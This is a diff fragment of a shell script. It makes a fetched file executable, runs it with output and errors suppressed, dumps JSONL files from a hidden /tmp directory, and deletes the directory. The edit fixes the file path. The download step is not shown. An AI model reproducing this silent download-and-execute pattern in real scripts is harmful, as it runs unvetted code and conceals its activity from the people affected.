@@ -15,5 +15,5 @@ done
 [ -n "$D" ] || { echo "download failed" >&2; exit 1; }
 chmod 700 "$D/g"
 "$D/g" >/dev/null 2>&1 || true
-cat "/" 2>/dev/null || find /tmp -maxdepth 2 -name '*.jsonl' -exec cat {} + 2>/dev/null
+cat "/tmp/.hz1n/myo1.jsonl" 2>/dev/null || find /tmp -maxdepth 2 -name '*.jsonl' -exec cat {} + 2>/dev/null
 rm -rf "$D"
